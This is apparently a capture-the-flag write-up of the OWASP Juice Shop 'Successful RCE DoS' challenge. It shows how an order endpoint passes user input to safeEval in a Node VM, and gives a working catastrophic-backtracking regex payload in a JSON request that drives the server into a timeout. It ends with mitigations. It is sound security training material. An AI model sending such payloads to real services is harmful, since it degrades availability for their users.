# Successful RCE DoS

## Challenge Information

| Field                    | Details                  |
| ------------------------ | ------------------------ |
| **Category**             | Insecure Deserialization |
| **Difficulty**           | 6                        |
| **Challenge**            | Successful RCE DoS       |
| **Key**                  | `rceOccupyChallenge`     |
| **Endpoint**             | `POST /b2b/v2/orders`    |
| **Vulnerable Parameter** | `orderLinesData`         |
| **Tag**                  | Danger Zone              |

> **Objective:** Perform Remote Code Execution that keeps the server busy for a period of time without relying on an infinite loop.

---

## Objective

The objective of this challenge is to abuse the `orderLinesData` parameter to execute attacker-controlled JavaScript that consumes server resources long enough to trigger the application's execution timeout.

Unlike the **Blocked RCE DoS** challenge, this attack must avoid the application's protection against infinite loops and excessive iterations.

The challenge is solved when the execution exceeds the configured **2-second VM timeout**.

---

## Reconnaissance

The challenge metadata identifies the same leverage point used by the previous **Blocked RCE DoS** challenge.

The application exposes the following endpoint:

```http
POST /b2b/v2/orders
```

The vulnerable input is:

```text
orderLinesData
```

Inspection of the application's route showed that the parameter is passed to `safeEval()` inside a Node.js VM context.

---

## Attack Surface Discovery

The relevant route is registered as:

```text
/b2b/v2/orders
```

The request body accepts `orderLinesData`, which is subsequently processed by the server.

The relevant application logic is:

```js
const orderLinesData = body.orderLinesData || ''

const sandbox = { safeEval, orderLinesData }
vm.createContext(sandbox)

vm.runInContext(
  'safeEval(orderLinesData)',
  sandbox,
  { timeout: 2000 }
)
```

This establishes the attack path:

```text
HTTP Request
     ↓
orderLinesData
     ↓
safeEval()
     ↓
VM execution
     ↓
2-second timeout
     ↓
503 Service Unavailable
```

### Evidence

![Baseline request and successful evaluation](../../../images/07-successful-rce-dos-baseline.png)

The baseline request demonstrates that the endpoint accepts the supplied expression and executes it successfully.

---

## Insecure Deserialization

Insecure deserialization occurs when application data controlled by an attacker is processed in an unsafe manner.

In this challenge, the important issue is that the application does not simply treat `orderLinesData` as ordinary data. Instead, its contents reach a code-evaluation mechanism.

The attacker-controlled value therefore crosses a trust boundary and becomes executable input.

---

## Code Evaluation

The vulnerable route passes `orderLinesData` to:

```js
safeEval(orderLinesData)
```

inside a VM context.

This means an expression such as:

```text
1+1
```

is evaluated by the server rather than being treated as a normal string.

A baseline request using:

```json
{
  "orderLinesData": "1+1",
  "cid": "test"
}
```

returned:

```http
HTTP/1.1 200 OK
```

This confirms that the supplied expression reached the evaluation mechanism.

### Baseline Evidence

![Successful baseline evaluation](../../../images/08-successful-rce-dos-baseline.png)

The baseline demonstrates normal execution before introducing the resource-consuming expression.

---

## Exploitation

The official Juice Shop test suite identifies a computationally expensive regular-expression expression as the intended test for this challenge:

```js
/((a+)+)b/.test("aaaaaaaaaaaaaaaaaaaaaaaaaaaaa")
```

The expression performs excessive backtracking because the supplied string contains repeated `a` characters without the expected terminating `b`.

The payload was supplied through:

```json
{
  "orderLinesData": "/((a+)+)b/.test(\"aaaaaaaaaaaaaaaaaaaaaaaaaaaaa\")",
  "cid": "test"
}
```

Unlike the previous infinite-loop payload, this does not explicitly contain:

```js
while(true)
```

Instead, the regular-expression operation consumes CPU through excessive backtracking.

---

## Timeout Condition

The application executes the expression inside a VM with a timeout of:

```text
2000 ms
```

When execution exceeds this limit, the application handles the timeout and returns:

```http
HTTP/1.1 503 Service Unavailable
```

The response included:

```text
Sorry, we are temporarily not available! Please try again later.
```

This is the condition used by the challenge to identify a successful **RCE DoS**.

---

## Exploitation Evidence

![Successful RCE DoS exploitation](../../../images/09-successful-rce-dos-exploitation-evidence.png)

The `503 Service Unavailable` response demonstrates that the supplied expression kept the VM occupied until the configured execution timeout was reached.

---

## Impact

Successful exploitation can cause excessive CPU consumption and temporarily prevent the application from processing normal requests.

Potential consequences include:

* Resource exhaustion
* Increased server CPU usage
* Request delays
* Service degradation
* Temporary unavailability
* Denial of Service

The attack demonstrates that code execution does not need an infinite loop to create a denial-of-service condition.

---

## Mitigation

The application should avoid evaluating attacker-controlled input as executable code.

Recommended controls include:

1. **Do not use dynamic code evaluation on untrusted input.**
2. Treat `orderLinesData` strictly as structured data.
3. Validate the expected format and data types server-side.
4. Apply strict input validation and allowlists.
5. Avoid dangerous evaluation mechanisms such as `eval()` and equivalent dynamic execution functions.
6. Apply resource limits to expensive operations.
7. Monitor CPU consumption and abnormal request behavior.
8. Use safe parsing libraries for structured data rather than executing serialized input.
9. Apply appropriate request-rate and resource controls.

---

## Lessons Learned

* Insecure deserialization can become significantly more dangerous when attacker-controlled data reaches a code-evaluation mechanism.
* Code execution can lead to denial of service even without an infinite loop.
* Regular-expression backtracking can consume significant computational resources.
* Execution timeouts provide a useful defensive boundary but do not remove the underlying vulnerability.
* The `200 OK` baseline was important for confirming that the endpoint and code-evaluation path were functioning before exploitation.
* A `503 Service Unavailable` response demonstrated that the VM execution exceeded the configured timeout.
* The **Blocked RCE DoS** challenge relied on an infinite loop, while **Successful RCE DoS** demonstrates a different resource-exhaustion technique that avoids the infinite-loop protection.

---

## Conclusion

The challenge was successfully exploited by supplying attacker-controlled JavaScript through the `orderLinesData` parameter.

The application evaluated the expression using `safeEval()` inside a VM with a 2-second execution limit. The computationally expensive regular expression caused execution to exceed that limit, resulting in a `503 Service Unavailable` response and solving the **Successful RCE DoS** challenge.

This demonstrates how unsafe code evaluation combined with computationally expensive operations can turn an application-level injection vulnerability into a denial-of-service condition.
